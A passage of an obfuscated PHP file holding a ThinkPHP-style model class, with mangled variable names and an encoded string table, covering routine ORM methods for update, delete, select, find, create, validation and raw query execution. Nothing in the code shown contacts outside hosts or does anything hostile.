$›ƒ÷˜³ñ[$ŠÈ¡ÈçÄ]; $¥éÛÛÓÊ[$ô¨“¹Õ[330]] = $Ø½ã»î‡; unset($›ƒ÷˜³ñ[$ŠÈ¡ÈçÄ]); } else { $this->error = think_lang($ô¨“¹Õ[329]); return !1; } } if (is_array($¥éÛÛÓÊ[$ô¨“¹Õ[330]]) && isset($¥éÛÛÓÊ[$ô¨“¹Õ[330]][$ŠÈ¡ÈçÄ])) { $œëÅ‡”¹ = $¥éÛÛÓÊ[$ô¨“¹Õ[330]][$ŠÈ¡ÈçÄ]; } if (!1 === $this->_beforeUpdate($›ƒ÷˜³ñ, $¥éÛÛÓÊ)) { return !1; } $ûíÓ§‚İ = $this->db->update($›ƒ÷˜³ñ, $¥éÛÛÓÊ); if (!1 !== $ûíÓ§‚İ) { if (isset($œëÅ‡”¹)) { $›ƒ÷˜³ñ[$ŠÈ¡ÈçÄ] = $œëÅ‡”¹; } $this->_afterUpdate($›ƒ÷˜³ñ, $¥éÛÛÓÊ); } return $ûíÓ§‚İ; } protected function _beforeUpdate(&$üó›Ó, $µß³¥ı) { } protected function _afterUpdate($ê×©‰¯ë, $¤ÌÖôğ) { } public function delete($„·£½‹û = array()) { $Ô¸å´¢ù =& $_SERVER[•€áå–Õ]; if (empty($„·£½‹û) && empty($this->options[$Ô¸å´¢ù[330]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $óúŸªª´ = $this->getPk(); if (is_numeric($„·£½‹û) || is_string($„·£½‹û)) { if (strpos($„·£½‹û, $Ô¸å´¢ù[60])) { $ÉíÙØ¹€[$óúŸªª´] = array($Ô¸å´¢ù[331], $„·£½‹û); } else { $ÉíÙØ¹€[$óúŸªª´] = $„·£½‹û; } $this->options[$Ô¸å´¢ù[330]] = $ÉíÙØ¹€; } $„·£½‹û = $this->_parseOptions(); if (is_array($„·£½‹û[$Ô¸å´¢ù[330]]) && isset($„·£½‹û[$Ô¸å´¢ù[330]][$óúŸªª´])) { $ŒØŸ£ù = $„·£½‹û[$Ô¸å´¢ù[330]][$óúŸªª´]; } $·ùóĞÉä = $this->db->delete($„·£½‹û); if (!1 !== $·ùóĞÉä) { $¢Š™ÉáÑ = array(); if (isset($ŒØŸ£ù)) { $¢Š™ÉáÑ[$óúŸªª´] = $ŒØŸ£ù; } $this->_after_delete($¢Š™ÉáÑ, $„·£½‹û); } return $·ùóĞÉä; } protected function _after_delete($”®ÔÎ…, $ò¼Ö›˜) { } public function select($Ñ¡¹¤ä² = array()) { $¢ª®’ Œ =& $_SERVER[•€áå–Õ]; if (is_string($Ñ¡¹¤ä²) || is_numeric($Ñ¡¹¤ä²)) { $™›ÔôÂÏ = $this->getPk(); if (strpos($Ñ¡¹¤ä², $¢ª®’ Œ[60])) { $çßÚö»ş[$™›ÔôÂÏ] = array($¢ª®’ Œ[331], $Ñ¡¹¤ä²); } else { $çßÚö»ş[$™›ÔôÂÏ] = $Ñ¡¹¤ä²; } $this->options[$¢ª®’ Œ[330]] = $çßÚö»ş; } elseif (!1 === $Ñ¡¹¤ä²) { $Ñ¡¹¤ä² = $this->_parseOptions(); return $¢ª®’ Œ[332] . $this->db->buildSelectSql($Ñ¡¹¤ä²) . $¢ª®’ Œ[333]; } $Ñ¡¹¤ä² = $this->_parseOptions(); $¦ÌØÉ¡ = $this->db->select($Ñ¡¹¤ä²); if (!1 === $¦ÌØÉ¡) { return !1; } if (empty($¦ÌØÉ¡)) { return null; } $this->_afterSelect($¦ÌØÉ¡, $Ñ¡¹¤ä²); return $¦ÌØÉ¡; } protected function _afterSelect(&$†Æ¤ì¦İ, $ıÍÕ™ÍÃ) { } public function buildSql($Í°Ÿ¿¦à = array()) { $¤Í¬•ò =& $_SERVER[•€áå–Õ]; $Í°Ÿ¿¦à = $this->_parseOptions($Í°Ÿ¿¦à); return $¤Í¬•ò[332] . $this->db->buildSelectSql($Í°Ÿ¿¦à) . $¤Í¬•ò[333]; } public function optionsValue($Œ¢¼¤¼í = null) { if (is_null($Œ¢¼¤¼í)) { return $this->options; } elseif (is_array($Œ¢¼¤¼í)) { $this->options = array_merge($this->options, $Œ¢¼¤¼í); } } protected function _parseOptions($¶şÁ­®Ë = array()) { $²æ¸Ú¶” =& $_SERVER[•€áå–Õ]; if (is_array($¶şÁ­®Ë)) { $¶şÁ­®Ë = array_merge($this->options, $¶şÁ­®Ë); } $this->options = array(); if (!isset($¶şÁ­®Ë[$²æ¸Ú¶”[334]])) { $¶şÁ­®Ë[$²æ¸Ú¶”[334]] = $this->getTableName(); $¤•ë™À® = $this->fields; } else { $¤•ë™À® = $this->getDbFields(); } if (!empty($¶şÁ­®Ë[$²æ¸Ú¶”[335]])) { $¶şÁ­®Ë[$²æ¸Ú¶”[334]] .= $²æ¸Ú¶”[63] . $¶şÁ­®Ë[$²æ¸Ú¶”[335]]; } $¶şÁ­®Ë[$²æ¸Ú¶”[336]] = $this->name; if (isset($¶şÁ­®Ë[$²æ¸Ú¶”[330]]) && is_array($¶şÁ­®Ë[$²æ¸Ú¶”[330]]) && !empty($¤•ë™À®) && !isset($¶şÁ­®Ë[$²æ¸Ú¶”[337]]) && !isset($¶şÁ­®Ë[$²æ¸Ú¶”[334]])) { foreach ($¶şÁ­®Ë[$²æ¸Ú¶”[330]] as $ò÷ı…Ğ => $ğóÁñß¿) { $ò÷ı…Ğ = trim($ò÷ı…Ğ); if (in_array($ò÷ı…Ğ, $¤•ë™À®, !0)) { if (is_scalar($ğóÁñß¿)) { $this->_parseType($¶şÁ­®Ë[$²æ¸Ú¶”[330]], $ò÷ı…Ğ); } } elseif (!is_numeric($ò÷ı…Ğ) && $²æ¸Ú¶”[21] != substr($ò÷ı…Ğ, 0, 1) && !1 === strpos($ò÷ı…Ğ, $²æ¸Ú¶”[20]) && !1 === strpos($ò÷ı…Ğ, $²æ¸Ú¶”[315]) && !1 === strpos($ò÷ı…Ğ, $²æ¸Ú¶”[338]) && !1 === strpos($ò÷ı…Ğ, $²æ¸Ú¶”[339])) { unset($¶şÁ­®Ë[$²æ¸Ú¶”[330]][$ò÷ı…Ğ]); } } } $this->_options_filter($¶şÁ­®Ë); return $¶şÁ­®Ë; } protected function _options_filter(&$šöÒˆ…Ö) { } protected function _parseType(&$ƒªî’¦¯, $ü­ø´Üö) { $¤´Ú˜½½ =& $_SERVER[•€áå–Õ]; if (empty($this->options[$¤´Ú˜½½[340]][$¤´Ú˜½½[4] . $ü­ø´Üö])) { $ğŸæ×‘¥ = strtolower($this->fields[$¤´Ú˜½½[307]][$ü­ø´Üö]); if (!1 !== strpos($ğŸæ×‘¥, $¤´Ú˜½½[341])) { } elseif (!1 === strpos($ğŸæ×‘¥, $¤´Ú˜½½[342]) && !1 !== strpos($ğŸæ×‘¥, $¤´Ú˜½½[343])) { $ƒªî’¦¯[$ü­ø´Üö] = intval($ƒªî’¦¯[$ü­ø´Üö]); } elseif (!1 !== strpos($ğŸæ×‘¥, $¤´Ú˜½½[344]) || !1 !== strpos($ğŸæ×‘¥, $¤´Ú˜½½[345])) { $ƒªî’¦¯[$ü­ø´Üö] = floatval($ƒªî’¦¯[$ü­ø´Üö]); } elseif (!1 !== strpos($ğŸæ×‘¥, $¤´Ú˜½½[346])) { $ƒªî’¦¯[$ü­ø´Üö] = (bool) $ƒªî’¦¯[$ü­ø´Üö]; } } } public function find($²Ùø’´ = array()) { $¤ö§“ =& $_SERVER[•€áå–Õ]; if (is_numeric($²Ùø’´) || is_string($²Ùø’´)) { $×öï—±¹[$this->getPk()] = intval($²Ùø’´); $this->options[$¤ö§“[330]] = $×öï—±¹; } $this->options[$¤ö§“[347]] = 1; $²Ùø’´ = $this->_parseOptions(); $Ì¹€öà÷ = $this->db->select($²Ùø’´); if (!1 === $Ì¹€öà÷) { return !1; } if (empty($Ì¹€öà÷)) { return null; } $this->data = $Ì¹€öà÷[0]; $this->_afterFind($this->data, $²Ùø’´); if (!empty($this->options[$¤ö§“[348]])) { return $this->returnResult($this->data, $this->options[$¤ö§“[348]]); } return $this->data; } protected function _afterFind(&$ããÂéò™, $†—ä¼î†) { } protected function returnResult($¹µ©ƒ¸Æ, $ÖØ±‡—À = '') { $ÕßúŒïÆ =& $_SERVER[•€áå–Õ]; if ($ÖØ±‡—À) { if (is_callable($ÖØ±‡—À)) { return call_user_func($ÖØ±‡—À, $¹µ©ƒ¸Æ); } switch (strtolower($ÖØ±‡—À)) { case $ÕßúŒïÆ[349]: return json_encode($¹µ©ƒ¸Æ); case $ÕßúŒïÆ[350]: return xml_encode($¹µ©ƒ¸Æ); } } return $¹µ©ƒ¸Æ; } public function parseFieldsMap($›Â×³œş, $šíïÕ•İ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $´’ö–‹Ù => $¾‘ÒÔô) { if ($šíïÕ•İ == 1) { if (isset($›Â×³œş[$¾‘ÒÔô])) { $›Â×³œş[$´’ö–‹Ù] = $›Â×³œş[$¾‘ÒÔô]; unset($›Â×³œş[$¾‘ÒÔô]); } } else { if (isset($›Â×³œş[$´’ö–‹Ù])) { $›Â×³œş[$¾‘ÒÔô] = $›Â×³œş[$´’ö–‹Ù]; unset($›Â×³œş[$´’ö–‹Ù]); } } } } return $›Â×³œş; } public function setField($ØíÂ³ìƒ, $½Ğš”¼ˆ = '') { if (is_array($ØíÂ³ìƒ)) { $üË Ğ°â = $ØíÂ³ìƒ; } else { $üË Ğ°â[$ØíÂ³ìƒ] = $½Ğš”¼ˆ; } return $this->save($üË Ğ°â); } public function setAdd($ñÒƒëÖ‘, $îö’ºÉ = 1) { $œÊôÁƒ =& $_SERVER[•€áå–Õ]; $¢„¡Á³Á = $ñÒƒëÖ‘ . $œÊôÁƒ[351] . $îö’ºÉ; if ($îö’ºÉ < 0) { $¢„¡Á³Á = $ñÒƒëÖ‘ . $îö’ºÉ; } return $this->setField($ñÒƒëÖ‘, array($œÊôÁƒ[352], $¢„¡Á³Á)); } public function getField($ÆšéçÓæ, $’¥¶ƒ—– = null) { $ö¯ƒá½© =& $_SERVER[•€áå–Õ]; $òÑ«ÙÉ²[$ö¯ƒá½©[328]] = $ÆšéçÓæ; $òÑ«ÙÉ² = $this->_parseOptions($òÑ«ÙÉ²); $ÆšéçÓæ = trim($ÆšéçÓæ); if (strpos($ÆšéçÓæ, $ö¯ƒá½©[60])) { if (!isset($òÑ«ÙÉ²[$ö¯ƒá½©[347]])) { $òÑ«ÙÉ²[$ö¯ƒá½©[347]] = is_numeric($’¥¶ƒ—–) ? $’¥¶ƒ—– : $ö¯ƒá½©[22]; } $ãÌ®›¶ª = $this->db->select($òÑ«ÙÉ²); if (!empty($ãÌ®›¶ª)) { $üÁéã¬ = explode($ö¯ƒá½©[60], $ÆšéçÓæ); $ÆšéçÓæ = array_keys($ãÌ®›¶ª[0]); $ãªÁâÍ¯ = array_shift($ÆšéçÓæ); $§ì˜™·Ì = array_shift($ÆšéçÓæ); $éè¨ñ“ = array(); $ö²íõ† = count($üÁéã¬); foreach ($ãÌ®›¶ª as $‘•›„±â) { $úÌùš¾Õ = $‘•›„±â[$ãªÁâÍ¯]; if (2 == $ö²íõ†) { $éè¨ñ“[$úÌùš¾Õ] = $‘•›„±â[$§ì˜™·Ì]; } else { $éè¨ñ“[$úÌùš¾Õ] = is_string($’¥¶ƒ—–) ? implode($’¥¶ƒ—–, $‘•›„±â) : $‘•›„±â; } } return $éè¨ñ“; } } else { if (!0 !== $’¥¶ƒ—–) { $òÑ«ÙÉ²[$ö¯ƒá½©[347]] = is_numeric($’¥¶ƒ—–) ? $’¥¶ƒ—– : 1; } if ($’¥¶ƒ—– === $ö¯ƒá½©[310]) { unset($òÑ«ÙÉ²[$ö¯ƒá½©[347]]); } $‘•›„±â = $this->db->select($òÑ«ÙÉ²); if (!empty($‘•›„±â)) { if ($’¥¶ƒ—– === $ö¯ƒá½©[310]) { return reset($‘•›„±â[0]); } if (!0 !== $’¥¶ƒ—– && 1 == $òÑ«ÙÉ²[$ö¯ƒá½©[347]]) { return reset($‘•›„±â[0]); } foreach ($‘•›„±â as $•è€ÇÍÍ) { $çŠÎº¤[] = $•è€ÇÍÍ[$ÆšéçÓæ]; } return $çŠÎº¤; } } return null; } public function create($Í‹÷×© = '', $Ä‘ÙÉíŸ = '') { $×ß»Œš =& $_SERVER[•€áå–Õ]; if (empty($Í‹÷×©)) { $Í‹÷×© = $_POST; } elseif (is_object($Í‹÷×©)) { $Í‹÷×© = get_object_vars($Í‹÷×©); } if (empty($Í‹÷×©) || !is_array($Í‹÷×©)) { $this->error = think_lang($×ß»Œš[326]); return !1; } $Í‹÷×© = $this->parseFieldsMap($Í‹÷×©, 0); $Ä‘ÙÉíŸ = $Ä‘ÙÉíŸ ? $Ä‘ÙÉíŸ : (!empty($Í‹÷×©[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$×ß»Œš[328]])) { $¿©¢ã» = $this->options[$×ß»Œš[328]]; unset($this->options[$×ß»Œš[328]]); } elseif ($Ä‘ÙÉíŸ == THINK_MODEL_INSERT && isset($this->insertFields)) { $¿©¢ã» = $this->insertFields; } elseif ($Ä‘ÙÉíŸ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¿©¢ã» = $this->updateFields; } if (isset($¿©¢ã»)) { if (is_string($¿©¢ã»)) { $¿©¢ã» = explode($×ß»Œš[60], $¿©¢ã»); } if (think_config($×ß»Œš[353])) { $¿©¢ã»[] = think_config($×ß»Œš[354]); } foreach ($Í‹÷×© as $ıíñËÌã => $ÁœÌ“Ìà) { if (!in_array($ıíñËÌã, $¿©¢ã»)) { unset($Í‹÷×©[$ıíñËÌã]); } } } if (!$this->autoValidation($Í‹÷×©, $Ä‘ÙÉíŸ)) { return !1; } if (!$this->autoCheckToken($Í‹÷×©)) { $this->error = think_lang($×ß»Œš[355]); return !1; } if ($this->autoCheckFields) { $¿©¢ã» = $this->getDbFields(); foreach ($Í‹÷×© as $ıíñËÌã => $ÁœÌ“Ìà) { if (!in_array($ıíñËÌã, $¿©¢ã»)) { unset($Í‹÷×©[$ıíñËÌã]); } elseif (MAGIC_QUOTES_GPC && is_string($ÁœÌ“Ìà)) { $Í‹÷×©[$ıíñËÌã] = stripslashes($ÁœÌ“Ìà); } } } $this->autoOperation($Í‹÷×©, $Ä‘ÙÉíŸ); $this->data = $Í‹÷×©; return $Í‹÷×©; } public function autoCheckToken($Ò£¾±õö) { $ûëÄ¯ıÂ =& $_SERVER[•€áå–Õ]; if (isset($this->options[$ûëÄ¯ıÂ[356]]) && !$this->options[$ûëÄ¯ıÂ[356]]) { return !0; } if (think_config($ûëÄ¯ıÂ[353])) { $«É º£ = think_config($ûëÄ¯ıÂ[354]); if (!isset($Ò£¾±õö[$«É º£]) || Session::get($«É º£)) { return !1; } list($çº÷†´á, $±§Ã•ûñ) = explode($ûëÄ¯ıÂ[21], $Ò£¾±õö[$«É º£]); if ($±§Ã•ûñ && Session::get($«É º£ . $ûëÄ¯ıÂ[20] . $çº÷†´á) === $±§Ã•ûñ) { Session::remove($«É º£ . $ûëÄ¯ıÂ[20] . $çº÷†´á); return !0; } if (think_config($ûëÄ¯ıÂ[357])) { Session::remove($«É º£ . $ûëÄ¯ıÂ[20] . $çº÷†´á); } return !1; } return !0; } public function regex($Öä¿ÍØ, $·ßË†ç) { $‡¹á·ÕÂ =& $_SERVER[•€áå–Õ]; $Á¦‹¸” = array($‡¹á·ÕÂ[358] => $‡¹á·ÕÂ[359], $‡¹á·ÕÂ[360] => $‡¹á·ÕÂ[361], $‡¹á·ÕÂ[362] => $‡¹á·ÕÂ[363], $‡¹á·ÕÂ[364] => $‡¹á·ÕÂ[365], $‡¹á·ÕÂ[366] => $‡¹á·ÕÂ[367], $‡¹á·ÕÂ[368] => $‡¹á·ÕÂ[369], $‡¹á·ÕÂ[370] => $‡¹á·ÕÂ[371], $‡¹á·ÕÂ[345] => $‡¹á·ÕÂ[372], $‡¹á·ÕÂ[373] => $‡¹á·ÕÂ[374]); if (isset($Á¦‹¸”[strtolower($·ßË†ç)])) { $·ßË†ç = $Á¦‹¸”[strtolower($·ßË†ç)]; } return preg_match($·ßË†ç, $Öä¿ÍØ) === 1; } private function autoOperation(&$ßÏæ®‚û, $à»´ğíƒ) { $¸à€±Õ =& $_SERVER[•€áå–Õ]; if (!empty($this->options[$¸à€±Õ[375]])) { $ô¦®‹Ÿ = $this->options[$¸à€±Õ[375]]; unset($this->options[$¸à€±Õ[375]]); } elseif (!empty($this->_auto)) { $ô¦®‹Ÿ = $this->_auto; } if (isset($ô¦®‹Ÿ)) { foreach ($ô¦®‹Ÿ as $Ëíà‘­²) { if (empty($Ëíà‘­²[2])) { $Ëíà‘­²[2] = THINK_MODEL_INSERT; } if ($à»´ğíƒ == $Ëíà‘­²[2] || $Ëíà‘­²[2] == THINK_MODEL_BOTH) { switch (trim($Ëíà‘­²[3])) { case $¸à€±Õ[376]: case $¸à€±Õ[377]: $¬°äÇÜà = isset($Ëíà‘­²[4]) ? (array) $Ëíà‘­²[4] : array(); if (isset($ßÏæ®‚û[$Ëíà‘­²[0]])) { array_unshift($¬°äÇÜà, $ßÏæ®‚û[$Ëíà‘­²[0]]); } if ($¸à€±Õ[376] == $Ëíà‘­²[3]) { $ßÏæ®‚û[$Ëíà‘­²[0]] = call_user_func_array($Ëíà‘­²[1], $¬°äÇÜà); } else { $ßÏæ®‚û[$Ëíà‘­²[0]] = call_user_func_array(array(&$this, $Ëíà‘­²[1]), $¬°äÇÜà); } break; case $¸à€±Õ[328]: $ßÏæ®‚û[$Ëíà‘­²[0]] = $ßÏæ®‚û[$Ëíà‘­²[1]]; break; case $¸à€±Õ[378]: if ($¸à€±Õ[22] === $ßÏæ®‚û[$Ëíà‘­²[0]]) { unset($ßÏæ®‚û[$Ëíà‘­²[0]]); } break; case $¸à€±Õ[379]: default: $ßÏæ®‚û[$Ëíà‘­²[0]] = $Ëíà‘­²[1]; } if (!1 === $ßÏæ®‚û[$Ëíà‘­²[0]]) { unset($ßÏæ®‚û[$Ëíà‘­²[0]]); } } } } return $ßÏæ®‚û; } protected function autoValidation($Ó¾Õ³û÷, $ÕÑİç÷Œ) { $âÃÁğ½ =& $_SERVER[•€áå–Õ]; if (!empty($this->options[$âÃÁğ½[380]])) { $øä…™ËÓ = $this->options[$âÃÁğ½[380]]; unset($this->options[$âÃÁğ½[380]]); } elseif (!empty($this->_validate)) { $øä…™ËÓ = $this->_validate; } if (isset($øä…™ËÓ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($øä…™ËÓ as $è¶ê‹ Î => $øüÍ’ı) { if (empty($øüÍ’ı[5]) || $øüÍ’ı[5] == THINK_MODEL_BOTH || $øüÍ’ı[5] == $ÕÑİç÷Œ) { if (0 == strpos($øüÍ’ı[2], $âÃÁğ½[381]) && strpos($øüÍ’ı[2], $âÃÁğ½[382])) { $øüÍ’ı[2] = think_lang(substr($øüÍ’ı[2], 2, -1)); } $øüÍ’ı[3] = isset($øüÍ’ı[3]) ? $øüÍ’ı[3] : THINK_EXISTS_VALIDATE; $øüÍ’ı[4] = isset($øüÍ’ı[4]) ? $øüÍ’ı[4] : $âÃÁğ½[383]; switch ($øüÍ’ı[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ó¾Õ³û÷, $øüÍ’ı)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($âÃÁğ½[22] != trim($Ó¾Õ³û÷[$øüÍ’ı[0]])) { if (!1 === $this->_validationField($Ó¾Õ³û÷, $øüÍ’ı)) { return !1; } } break; default: if (isset($Ó¾Õ³û÷[$øüÍ’ı[0]])) { if (!1 === $this->_validationField($Ó¾Õ³û÷, $øüÍ’ı)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ç±äë—¿, $¦«˜µ¤) { if (!1 === $this->_validationFieldItem($ç±äë—¿, $¦«˜µ¤)) { if ($this->patchValidate) { $this->error[$¦«˜µ¤[0]] = $¦«˜µ¤[2]; } else { $this->error = $¦«˜µ¤[2]; return !1; } } return; } protected function _validationFieldItem($‰¼µÁ®, $€Òë¡ï—) { $ˆÏğ€™Â =& $_SERVER[•€áå–Õ]; switch (strtolower(trim($€Òë¡ï—[4]))) { case $ˆÏğ€™Â[376]: case $ˆÏğ€™Â[377]: $Šæ•»’ß = isset($€Òë¡ï—[6]) ? (array) $€Òë¡ï—[6] : array(); if (is_string($€Òë¡ï—[0]) && strpos($€Òë¡ï—[0], $ˆÏğ€™Â[60])) { $€Òë¡ï—[0] = explode($ˆÏğ€™Â[60], $€Òë¡ï—[0]); } if (is_array($€Òë¡ï—[0])) { foreach ($€Òë¡ï—[0] as $×§À”à«) { $ĞñüÎ–[$×§À”à«] = $‰¼µÁ®[$×§À”à«]; } array_unshift($Šæ•»’ß, $ĞñüÎ–); } else { array_unshift($Šæ•»’ß, $‰¼µÁ®[$€Òë¡ï—[0]]); } if ($ˆÏğ€™Â[376] == $€Òë¡ï—[4]) { return call_user_func_array($€Òë¡ï—[1], $Šæ•»’ß); } else { return call_user_func_array(array(&$this, $€Òë¡ï—[1]), $Šæ•»’ß); } case $ˆÏğ€™Â[384]: return $‰¼µÁ®[$€Òë¡ï—[0]] == $‰¼µÁ®[$€Òë¡ï—[1]]; case $ˆÏğ€™Â[385]: if (is_string($€Òë¡ï—[0]) && strpos($€Òë¡ï—[0], $ˆÏğ€™Â[60])) { $€Òë¡ï—[0] = explode($ˆÏğ€™Â[60], $€Òë¡ï—[0]); } $µîÎ«•Í = array(); if (is_array($€Òë¡ï—[0])) { foreach ($€Òë¡ï—[0] as $×§À”à«) { $µîÎ«•Í[$×§À”à«] = $‰¼µÁ®[$×§À”à«]; } } else { $µîÎ«•Í[$€Òë¡ï—[0]] = $‰¼µÁ®[$€Òë¡ï—[0]]; } if (!empty($‰¼µÁ®[$this->getPk()])) { $µîÎ«•Í[$this->getPk()] = array($ˆÏğ€™Â[386], $‰¼µÁ®[$this->getPk()]); } if ($this->where($µîÎ«•Í)->find()) { return !1; } return !0; default: return $this->check($‰¼µÁ®[$€Òë¡ï—[0]], $€Òë¡ï—[1], $€Òë¡ï—[4]); } } public function check($öÉ¤Ì§…, $ºúí„ä», $™ÔôŸ€ã = "\x72\145\x67\x65\x78") { $–ÍÚÕÅ÷ =& $_SERVER[•€áå–Õ]; $™ÔôŸ€ã = strtolower(trim($™ÔôŸ€ã)); switch ($™ÔôŸ€ã) { case $–ÍÚÕÅ÷[17]: case $–ÍÚÕÅ÷[387]: $Öòôƒ»é = is_array($ºúí„ä») ? $ºúí„ä» : explode($–ÍÚÕÅ÷[60], $ºúí„ä»); return $™ÔôŸ€ã == $–ÍÚÕÅ÷[17] ? in_array($öÉ¤Ì§…, $Öòôƒ»é) : !in_array($öÉ¤Ì§…, $Öòôƒ»é); case $–ÍÚÕÅ÷[388]: case $–ÍÚÕÅ÷[389]: if (is_array($ºúí„ä»)) { $àÈ­…Úş = $ºúí„ä»[0]; $Å‹¶Š÷ñ = $ºúí„ä»[1]; } else { list($àÈ­…Úş, $Å‹¶Š÷ñ) = explode($–ÍÚÕÅ÷[60], $ºúí„ä»); } return $™ÔôŸ€ã == $–ÍÚÕÅ÷[388] ? $öÉ¤Ì§… >= $àÈ­…Úş && $öÉ¤Ì§… <= $Å‹¶Š÷ñ : $öÉ¤Ì§… < $àÈ­…Úş || $öÉ¤Ì§… > $Å‹¶Š÷ñ; case $–ÍÚÕÅ÷[390]: case $–ÍÚÕÅ÷[391]: return $™ÔôŸ€ã == $–ÍÚÕÅ÷[390] ? $öÉ¤Ì§… == $ºúí„ä» : $öÉ¤Ì§… != $ºúí„ä»; case $–ÍÚÕÅ÷[392]: $„™²õÊ¢ = mb_strlen($öÉ¤Ì§…, $–ÍÚÕÅ÷[393]); if (strpos($ºúí„ä», $–ÍÚÕÅ÷[60])) { list($àÈ­…Úş, $Å‹¶Š÷ñ) = explode($–ÍÚÕÅ÷[60], $ºúí„ä»); return $„™²õÊ¢ >= $àÈ­…Úş && $„™²õÊ¢ <= $Å‹¶Š÷ñ; } else { return $„™²õÊ¢ == $ºúí„ä»; } case $–ÍÚÕÅ÷[394]: list($‚Å àš±, $İ”—Ï“) = explode($–ÍÚÕÅ÷[60], $ºúí„ä»); if (!is_numeric($‚Å àš±)) { $‚Å àš± = strtotime($‚Å àš±); } if (!is_numeric($İ”—Ï“)) { $İ”—Ï“ = strtotime($İ”—Ï“); } return NOW_TIME >= $‚Å àš± && NOW_TIME <= $İ”—Ï“; case $–ÍÚÕÅ÷[395]: return in_array(get_client_ip(), explode($–ÍÚÕÅ÷[60], $ºúí„ä»)); case $–ÍÚÕÅ÷[396]: return !in_array(get_client_ip(), explode($–ÍÚÕÅ÷[60], $ºúí„ä»)); case $–ÍÚÕÅ÷[383]: default: return $this->regex($öÉ¤Ì§…, $ºúí„ä»); } } public function query($ÀğÅè†Ñ, $Üë¾ë Œ = false) { $¬×Êæ“˜ =& $_SERVER[•€áå–Õ]; if (!is_bool($Üë¾ë Œ) && !is_array($Üë¾ë Œ)) { $Üë¾ë Œ = func_get_args(); array_shift($Üë¾ë Œ); } $ÀğÅè†Ñ = str_replace(array($¬×Êæ“˜[12], $¬×Êæ“˜[397]), $¬×Êæ“˜[63], $ÀğÅè†Ñ); $ÀğÅè†Ñ = $this->parseSql($ÀğÅè†Ñ, $Üë¾ë Œ); return $this->db->query($ÀğÅè†Ñ); } public function execute($ä¿òì†„, $´ë¡ìç = false) { if (!is_bool($´ë¡ìç) && !is_array($´ë¡ìç)) { $´ë¡ìç = func_get_args(); array_shift($´ë¡ìç); } $ä¿òì†„ = $this->parseSql($ä¿òì†„, $´ë¡ìç); return $this->db->execute($ä¿òì†„); } protected function parseSql($Û”…Å›Ä, $¼Ïí°Á¹) { $¤øÚü¨• =& $_SERVER[•€áå–Õ]; if (!0 === $¼Ïí°Á¹) { $ÓÒÙ“¾ = $this->_parseOptions(); $Û”…Å›Ä = $this->db->parseSql($Û”…Å›Ä, $ÓÒÙ“¾); } elseif (is_array($¼Ïí°Á¹)) { $¼Ïí°Á¹ = array_map(array($this->db, $¤øÚü¨•[398]), $¼Ïí°Á¹); $Û”…Å›Ä = vsprintf($Û”…Å›Ä, $¼Ïí°Á¹); } else { $Û”…Å›Ä = strtr($Û”…Å›Ä, array($¤øÚü¨•[399] => $this->getTableName(), $¤øÚü¨•[400] => think_config($¤øÚü¨•[299]))); } $this->db->setModel($this->name); return $Û”…Å›Ä; } public function db($’·µÃƒ‡ = '', $ëä¾æÀ = '', $ÌÏ´îÊõ = array()) { $œÙİ§· =& $_SERVER[•€áå–Õ]; if ($œÙİ§·[22] === $’·µÃƒ‡ && $this->db) { return $this->db; } static $‹Ì°ÜùÍ = array(); static $âƒ–îş¹ = array(); if (!isset($âƒ–îş¹[$’·µÃƒ‡]) || isset($âƒ–îş¹[$’·µÃƒ‡]) && $ëä¾æÀ && $‹Ì°ÜùÍ[$’·µÃƒ‡] != $ëä¾æÀ) { if (!empty($ëä¾æÀ) && is_string($ëä¾æÀ) && !1 === strpos($ëä¾æÀ, $œÙİ§·[18])) { $ëä¾æÀ = think_config($ëä¾æÀ); } $’·µÃƒ‡ = think_guid($ëä¾æÀ); $âƒ–îş¹[$’·µÃƒ‡] = Db::getInstance($ëä¾æÀ); } elseif (NULL === $ëä¾æÀ) { $âƒ–îş¹[$’·µÃƒ‡]->close(); unset($âƒ–îş¹[$’·µÃƒ‡]); return; } if (!empty($ÌÏ´îÊõ)) { if (is_string($ÌÏ´îÊõ)) { parse_str($ÌÏ´îÊõ, $ÌÏ´îÊõ); } foreach ($ÌÏ´îÊõ as $ÖòæË²Â => $§‰ø´¿º) { $this->setProperty($ÖòæË²Â, $§‰ø´¿º); } } $‹Ì°ÜùÍ[$’·µÃƒ‡] = $ëä¾æÀ; $this->db = $âƒ–îş¹[$’·µÃƒ‡]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $…±¨œäò = get_class($this); if ($…±¨œäò == $_SERVER[•€áå–Õ][401]) { return $this->name; } $this->name = substr($…±¨œäò, 0, -5); } return $this->name; } public function getTableName() { $°”÷±Ô‚ =& $_SERVER[•€áå–Õ]; if (empty($this->trueTableName)) { $Œ´ú‘Ã« = !empty($this->tablePrefix) ? $this->tablePrefix : $°”÷±Ô‚[22]; if (!empty($this->tableName)) { $Œ´ú‘Ã« .= $this->tableName; } else { $Œ´ú‘Ã« .= think_parse_name($this->name); } $this->trueTableName = strtolower($Œ´ú‘Ã«); } return (!empty($this->dbName) ? $this->dbName . $°”÷±Ô‚[20] : $°”÷±Ô‚[22]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Íæòª­ =& $_SERVER[•€áå–Õ]; return isset($this->fields[$Íæòª­[306]]) ? $this->fields[$Íæòª­[306]] : $this->pk; } public function getDbFields() { $ñ¸»ıÏè =& $_SERVER[•€áå–Õ]; if (isset($this->options[$ñ¸»ıÏè[334]])) { $¨áı·Ã = $this->db->getFields($this->options[$ñ¸»ıÏè[334]]); return $¨áı·Ã ? array_keys($¨áı·Ã) : !1; } if ($this->fields) { $¨áı·Ã = $this->fields; unset($¨áı·Ã[$ñ¸»ıÏè[305]], $¨áı·Ã[$ñ¸»ıÏè[306]], 